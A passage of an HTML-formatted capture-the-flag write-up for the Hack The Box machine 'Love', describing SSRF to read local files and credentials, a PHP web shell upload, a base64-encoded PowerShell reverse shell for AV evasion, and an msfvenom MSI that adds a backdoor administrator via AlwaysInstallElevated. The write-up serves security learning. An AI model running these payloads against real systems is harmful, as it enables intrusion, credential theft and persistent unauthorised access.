+<li>A MySQL server on port 3306, I will stay away from this for now because IP block</li>
+<li>WinRM on 5985/6, I will use this for lateral movement if I have creds.</li>
+</ul>
+<p>Seeing Apache and MySQL on a Windows host, I can assume that this machine uses XAMPP.</p>
+<p>Nmap also identified two hostnames: <code>www.love.htb</code> and <code>staging.love.htb</code>. I will add these to my <code>/etc/hosts</code>.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «love» «10.10.14.51» 
+</span></span><span class="line"><span class="cl">$ sudo <span class="nb">echo</span> <span class="s1">&#39;www.love.htb staging.love.htb&#39;</span> &gt;&gt; /etc/hosts</span></span></code></pre>
+</figure><h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-445---smb">TCP 445 - SMB</h3>
+<p>Anonymous login is not allowed here, I will re-visit this later when I have creds.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «love» «10.10.14.51» 
+</span></span><span class="line"><span class="cl">$ smbclient -N -L //10.10.10.239 
+</span></span><span class="line"><span class="cl">session setup failed: NT_STATUS_ACCESS_DENIED</span></span></code></pre>
+</figure><h3 id="tcp-5000">TCP 5000</h3>
+<p>Visiting this port results in a <strong>403 Forbidden</strong> message error.</p>
+<p><div class="img-container"><img src="imgs/image-20210809005411183.png" alt="image-20210809005411183"  /></div>
+</p>
+<h3 id="tcp-80---website">TCP 80 - Website</h3>
+<p>Visiting port 80 with the IP or the hostname returns the same content.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «love» «10.10.14.51» 
+</span></span><span class="line"><span class="cl">$ <span class="k">for</span> i in 10.10.10.239 www.love.htb<span class="p">;</span> <span class="k">do</span> <span class="nb">echo</span> -n <span class="s2">&#34;</span><span class="nv">$i</span><span class="s2"> &#34;</span><span class="p">;</span> curl -s <span class="nv">$i</span> <span class="p">|</span> wc -c<span class="p">;</span> <span class="k">done</span>                      
+</span></span><span class="line"><span class="cl">10.10.10.239 <span class="m">4388</span>
+</span></span><span class="line"><span class="cl">www.love.htb <span class="m">4388</span></span></span></code></pre>
+</figure><p>On the browser, the site displays a login form of a Voting System app.</p>
+<p><div class="img-container"><img src="imgs/image-20210809003519382.png" alt="image-20210809003519382"  /></div>
+</p>
+<p>Trying some random IDs and common passwords didn&rsquo;t work here.</p>
+<p><div class="img-container"><img src="imgs/image-20210809004024045.png" alt="image-20210809004024045"  /></div>
+</p>
+<h4 id="gobuster">Gobuster</h4>
+<p><code>Gobuster</code> discovers a bunch of directories, but one that stands out is  <code>/admin</code>.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «love» «10.10.14.51» 
+</span></span><span class="line"><span class="cl">$ gobuster dir -f -u http://www.love.htb/ -w /opt/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt -x txt,php -o gobuster/gobuster-S-80 -t <span class="nv">40</span>                                                                                                                                                           
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">Gobuster v3.1.0
+</span></span><span class="line"><span class="cl">by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Url:                     http://www.love.htb/
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Method:                  GET
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">40</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Negative Status codes:   <span class="m">404</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.1.0
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Extensions:              txt,php
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Add Slash:               <span class="nb">true</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">2021/08/08 13:16:14 Starting gobuster in directory enumeration <span class="nv">mode</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">/cgi-bin/             <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 302<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/admin/               <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 6198<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/includes/            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 2261<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/plugins/             <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 2490<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/images/              <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 2719<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/logout.php           <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; index.php<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/login.php            <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; index.php<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/webalizer/           <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 302<span class="o">]</span>              
+</span></span><span class="line"><span class="cl">/home.php             <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; index.php<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/index.php            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 4388<span class="o">]</span>             
+</span></span><span class="line"><span class="cl">/phpmyadmin/          <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 302<span class="o">]</span>              
+</span></span><span class="line"><span class="cl">/icons/               <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 74798<span class="o">]</span>            
+</span></span><span class="line"><span class="cl">/preview.php          <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; index.php<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/examples/            <span class="o">(</span>Status: 503<span class="o">)</span> <span class="o">[</span>Size: 402<span class="o">]</span>              
+</span></span><span class="line"><span class="cl">/dist/                <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 1389<span class="o">]</span>             
+</span></span><span class="line"><span class="cl">/tcpdf/               <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 2710<span class="o">]</span>             
+</span></span><span class="line"><span class="cl">/licenses/            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 421<span class="o">]</span>              
+</span></span><span class="line"><span class="cl">/server-status/       <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 421<span class="o">]</span>              
+</span></span><span class="line"><span class="cl">/con.php              <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 302<span class="o">]</span>              
+</span></span><span class="line"><span class="cl">/con/                 <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 302<span class="o">]</span>              
+</span></span><span class="line"><span class="cl">/con.txt              <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 302<span class="o">]</span>              
+</span></span><span class="line"><span class="cl">/aux/                 <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 302<span class="o">]</span>              
+</span></span><span class="line"><span class="cl">/aux.php              <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 302<span class="o">]</span>              
+</span></span><span class="line"><span class="cl">/aux.txt              <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 302<span class="o">]</span>              
+</span></span><span class="line"><span class="cl">                                                             
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">2021/08/08 13:18:01 <span class="nv">Finished</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span></span></span></code></pre>
+</figure><h4 id="admin">/admin</h4>
+<p>When I visit <code>/admin</code>, the page presents the same login form. But this time, instead of voter&rsquo;s ID, it uses username.</p>
+<p><div class="img-container"><img src="imgs/image-20210809003454272.png" alt="image-20210809003454272"  /></div>
+</p>
+<p>Submitting several credentials only reveals that <code>admin</code> is a valid username here.</p>
+<h3 id="tcp-80---staginglovehtb">TCP 80 - staging.love.htb</h3>
+<p>On <code>staging.love.htb</code>, the site provides an online file scanner.</p>
+<p><div class="img-container"><img src="imgs/image-20210809010051350.png" alt="image-20210809010051350"  /></div>
+</p>
+<p>The &ldquo;Demo&rdquo; menu points to <code>/beta.php</code>, and it allows visitor to insert a URL there.</p>
+<p><div class="img-container"><img src="imgs/image-20210809010747052.png" alt="image-20210809010747052"  /></div>
+</p>
+<p>While having my netcat listener in listening mode, I entered my HTB IP there, and my listener received the following request.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «love» «10.10.14.51» 
+</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">80</span>
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">80</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.51<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.239<span class="o">]</span> <span class="m">49806</span>
+</span></span><span class="line"><span class="cl">GET /iamf HTTP/1.1
+</span></span><span class="line"><span class="cl">Host: 10.10.14.51
+</span></span><span class="line"><span class="cl">Accept: */*</span></span></code></pre>
+</figure><p>Based on the received request, I&rsquo;m guessing the request was crafted using PHP curl. If the user agent contains &ldquo;WindowsPowerShell&rdquo;, I&rsquo;m going to use Responder to see if I can steal the NTLMv2 response.</p>
+<p>Playing a bit with it reveals that it can render HTML.</p>
+<p><div class="img-container"><img src="imgs/image-20210809014613874.png" alt="image-20210809014613874"  /></div>
+</p>
+<p>The key take away from here is that <code>staging.love.htb/beta.php</code> <strong>can make a HTTP request.</strong></p>
+<h3 id="tcp-443---website">TCP 443 - Website</h3>
+<p>On HTTPS, the SSL certificate leaks an email address and a potential username: <code>roy@love.htb</code>.</p>
+<p><div class="img-container"><img src="imgs/image-20210809005318725.png" alt="image-20210809005318725"  /></div>
+</p>
+<p>And both the HTTPS versions of <code>www.love.htb</code> and <code>staging.love.htb</code> return the Forbidden message error.</p>
+<p><div class="img-container"><img src="imgs/image-20210809012934262.png" alt="image-20210809012934262"  /></div>
+</p>
+<p><div class="img-container"><img src="imgs/image-20210809012945191.png" alt="image-20210809012945191"  /></div>
+</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="shell-as-phoebe">Shell as phoebe</h3>
+<h4 id="ssrf">SSRF</h4>
+<p>The behavior of the file scanner on <code>staging.love.htb</code> making a HTTP (not always) request can be abused to access internal resources that previously were inaccessible due to IP restrictions. This attack is often referred as Server-Side Request Forgery (SSRF).</p>
+<p>When I submit <code>file:///C:/xampp/apache/conf/extra/httpd-vhosts.conf</code>, it returns the virtual host configuration file.</p>
+<p><div class="img-container"><img src="imgs/image-20210809033303050.png" alt="image-20210809033303050"  /></div>
+</p>
+<p>The string &ldquo;C:/xampp/htdocs/passwordmanager&rdquo; immediately draws my attention. Based on that config, the service on port 5000 is a password manager, and the access is limited to only allow connections from <code>127.0.0.1</code>.</p>
+<p>Assuming there is an index file, I try to submit  <code>file:///C:/xampp/htdocs/passwordmanager/index.php</code> , and the file is exist.</p>
+<p><div class="img-container"><img src="imgs/image-20210809034759102.png" alt="image-20210809034759102"  /></div>
+</p>
+<p>Now if I submit <code>file:///C:/xampp/htdocs/passwordmanager/creds.txt</code>, it returns the following:</p>
+<p><div class="img-container"><img src="imgs/image-20210809034943436.png" alt="image-20210809034943436"  /></div>
+</p>
+<p>Alternatively, I can just visit <code>http://127.0.0.1:5000/</code> and the file scanner will render the page of password manager, in which contains the admin credentials.</p>
+<p><div class="img-container"><img src="imgs/image-20210809033828889.png" alt="image-20210809033828889"  /></div>
+</p>
+<p>I can use that creds to access the admin dashboard.</p>
+<p><div class="img-container"><img src="imgs/image-20210809034300363.png" alt="image-20210809034300363"  /></div>
+</p>
+<h4 id="php-webshell">PHP webshell</h4>
+<p>On  <code>admin/voters.php</code>, there is a photo upload feature.</p>
+<p><div class="img-container"><img src="imgs/image-20210809035502402.png" alt="image-20210809035502402"  /></div>
+</p>
+<p>I will intercept the request to modify the photo section to a PHP web shell and then send it afterwards. It gets uploaded smoothly.</p>
+<p><div class="img-container"><img src="imgs/image-20210809040225250.png" alt="image-20210809040225250"  /></div>
+</p>
+<p>When I reload the page, I see the voter I added is there with broken photo, and that because it loads my PHP web shell as image.</p>
+<p><div class="img-container"><img src="imgs/image-20210809041027772.png" alt="image-20210809041027772"  /></div>
+</p>
+<p>The uploaded web shell is accessible at  <code>http://www.love.htb/images/shell.php</code>, and now I have code execution as <strong>phoebe</strong>.</p>
+<p><div class="img-container"><img src="imgs/image-20210809040810276.png" alt="image-20210809040810276"  /></div>
+</p>
+<h4 id="interactive-shell-access">Interactive shell access</h4>
+<p>To get an interactive shell I will use a PowerShell one-liner reverse shell.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «love» «10.10.14.51» 
+</span></span><span class="line"><span class="cl">$ cat exploits/revshell.ps1
+</span></span><span class="line"><span class="cl"><span class="nv">$client</span> <span class="o">=</span> New-Object System.Net.Sockets.TCPClient<span class="o">(</span><span class="s1">&#39;10.10.14.51&#39;</span>,53<span class="o">)</span><span class="p">;</span><span class="nv">$stream</span> <span class="o">=</span> <span class="nv">$client</span>.GetStream<span class="o">()</span><span class="p">;</span><span class="o">[</span>byte<span class="o">[]]</span><span class="nv">$bytes</span> <span class="o">=</span> 0..65535<span class="p">|</span>%<span class="o">{</span>0<span class="o">}</span><span class="p">;</span><span class="k">while</span><span class="o">((</span><span class="nv">$i</span> <span class="o">=</span> <span class="nv">$stream</span>.Read<span class="o">(</span><span class="nv">$bytes</span>, 0, <span class="nv">$bytes</span>.Length<span class="o">))</span> -ne 0<span class="o">){</span><span class="p">;</span><span class="nv">$data</span> <span class="o">=</span> <span class="o">(</span>New-Object -TypeName System.Text.ASCIIEncoding<span class="o">)</span>.GetString<span class="o">(</span><span class="nv">$bytes</span>,0, <span class="nv">$i</span><span class="o">)</span><span class="p">;</span><span class="nv">$sendback</span> <span class="o">=</span> <span class="o">(</span>iex <span class="nv">$data</span> 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> Out-String <span class="o">)</span><span class="p">;</span><span class="nv">$sendback2</span> <span class="o">=</span> <span class="nv">$sendback</span> + <span class="s1">&#39;PS &#39;</span> + <span class="o">(</span><span class="nb">pwd</span><span class="o">)</span>.Path + <span class="s1">&#39;&gt; &#39;</span><span class="p">;</span><span class="nv">$sendbyte</span> <span class="o">=</span> <span class="o">([</span>text.encoding<span class="o">]</span>::ASCII<span class="o">)</span>.GetBytes<span class="o">(</span><span class="nv">$sendback2</span><span class="o">)</span><span class="p">;</span><span class="nv">$stream</span>.Write<span class="o">(</span><span class="nv">$sendbyte</span>,0,<span class="nv">$sendbyte</span>.Length<span class="o">)</span><span class="p">;</span><span class="nv">$stream</span>.Flush<span class="o">()}</span><span class="p">;</span><span class="nv">$client</span>.Close<span class="o">()</span></span></span></code></pre>
+</figure><p>Because it is a Windows machine, I will encoded it with base64 to avoid AV.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «love» «10.10.14.51» 
+</span></span><span class="line"><span class="cl">$ cat exploits/revshell.ps1<span class="p">|</span> iconv -t UTF-16LE<span class="p">|</span> base64 -w0
+</span></span><span class="line"><span class="cl"><span class="nv">JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA0AC4ANQAxACcALAA1ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACcAUABTACAAJwAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACcAPgAgACcAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkACgA</span><span class="o">=</span></span></span></code></pre>
+</figure><p>I will setup a listener and leverage the web shell to execute my payload.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">http://www.love.htb/images/shell.php?f<span class="o">=</span>powershell.exe -enc <span class="nv">JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA0AC4ANQAxACcALAA1ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACcAUABTACAAJwAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACcAPgAgACcAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkACgA</span><span class="o">=</span></span></span></code></pre>
+</figure><p>On my listener.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «love» «10.10.14.51» 
+</span></span><span class="line"><span class="cl">$ rlwrap nc -nvlp <span class="m">53</span>
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.51<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.239<span class="o">]</span> <span class="m">49950</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PS C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\o</span>mrs<span class="se">\i</span>mages&gt;</span></span></code></pre>
+</figure><p>The user flag is done here.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\P</span>hoebe<span class="se">\D</span>esktop&gt; dir
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    Directory: C:<span class="se">\U</span>sers<span class="se">\P</span>hoebe<span class="se">\D</span>esktop
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Mode                 LastWriteTime         Length Name                                                                 
+</span></span><span class="line"><span class="cl">----                 -------------         ------ ----                                                                 
+</span></span><span class="line"><span class="cl">-ar---          8/8/2021   3:50 AM             <span class="m">34</span> user.txt                                                             
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\P</span>hoebe<span class="se">\D</span>esktop&gt; <span class="nb">type</span> user.txt
+</span></span><span class="line"><span class="cl">65a5...<span class="o">[</span>SNIP<span class="o">]</span>...</span></span></code></pre>
+</figure><p>The flag also accessible using SSRF.</p>
+<p><div class="img-container"><img src="imgs/image-20210809043334065.png" alt="image-20210809043334065"  /></div>
+</p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-system">Shell as SYSTEM</h3>
+<h4 id="enumeration-1">Enumeration</h4>
+<p>WinPEAS finds that <code>AlwaysInstallElevated</code> is set to 1. This means installation of an app always runs in elevated mode (SYSTEM), and it can be abused to install a malicious <code>.msi</code> package.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">[+] Checking AlwaysInstallElevated
+</span></span><span class="line"><span class="cl">   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated
+</span></span><span class="line"><span class="cl">    AlwaysInstallElevated set to 1 in HKLM!
+</span></span><span class="line"><span class="cl">    AlwaysInstallElevated set to 1 in HKCU!</span></span></code></pre>
+</figure><h4 id="exploitation---malicious-msi-installer">Exploitation - Malicious .msi Installer</h4>
+<p>I will generate a malicious <code>.msi</code> that will add a user with administrative access using <code>msfvenom</code></p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.51» 
+</span></span><span class="line"><span class="cl">$ msfvenom -p windows/adduser <span class="nv">USER</span><span class="o">=</span>iamf <span class="nv">PASS</span><span class="o">=</span>P@ssword123! -f msi -o iamf.msi
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> No arch selected, selecting arch: x86 from the payload
+</span></span><span class="line"><span class="cl">No encoder specified, outputting raw payload
+</span></span><span class="line"><span class="cl">Payload size: <span class="m">270</span> bytes
+</span></span><span class="line"><span class="cl">Final size of msi file: <span class="m">159744</span> bytes
+</span></span><span class="line"><span class="cl">Saved as: iamf.msi</span></span></code></pre>
+</figure><p>I will host the <code>.msi</code> using Python web server.</p>
+<p>On Love, I will grab the msi and install the package immediately.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\P</span>ublic&gt; curl.exe -O 10.10.14.53/iamf.msi
+</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\P</span>ublic&gt; msiexec /quiet /qn /i iamf.msi
+</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\P</span>ublic&gt; net user
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User accounts <span class="k">for</span> <span class="se">\\</span>LOVE                                                                                                                                                   
+</span></span><span class="line"><span class="cl">                                                                                                                                                                           
+</span></span><span class="line"><span class="cl">-------------------------------------------------------------------------------                                                                                            
+</span></span><span class="line"><span class="cl">Administrator            DefaultAccount           Guest                                                                                                                    
+</span></span><span class="line"><span class="cl">iamf                     Phoebe                   WDAGUtilityAccount                                                                                                       
+</span></span><span class="line"><span class="cl">The <span class="nb">command</span> completed successfully.                                                                                                                                        
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\P</span>ublic&gt; </span></span></code></pre>
+</figure><h4 id="psexec---system">Psexec - SYSTEM</h4>
+<p>I can login using my backdoor user with help of <code>psexec.py</code>.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «exploits» «10.10.14.49» 
+</span></span><span class="line"><span class="cl">$ psexec.py love/iamf:<span class="s1">&#39;P@ssword123!&#39;</span>@10.10.10.239                                            
+</span></span><span class="line"><span class="cl">Impacket v0.9.22 - Copyright <span class="m">2020</span> SecureAuth Corporation
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Requesting shares on 10.10.10.239.....
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Found writable share ADMIN$
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Uploading file VlzRTIEE.exe
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Opening SVCManager on 10.10.10.239.....
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Creating service lRbn on 10.10.10.239.....
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Starting service lRbn.....
+</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Press <span class="nb">help</span> <span class="k">for</span> extra shell commands
+</span></span><span class="line"><span class="cl">Microsoft Windows <span class="o">[</span>Version 10.0.19042.867<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="o">(</span>c<span class="o">)</span> <span class="m">2020</span> Microsoft Corporation. All rights reserved.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;whoami
+</span></span><span class="line"><span class="cl">nt authority<span class="se">\s</span>ystem
+</span></span><span class="line"><span class="cl">C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;hostname
+</span></span><span class="line"><span class="cl">love</span></span></code></pre>
+</figure><h4 id="alternative-printnightmare">(Alternative) PrintNightmare</h4>
+<p>Love also vulnerable to LPE <a href="https://github.com/calebstewart/CVE-2021-1675"target="_blank" rel="noopener noreferrer"
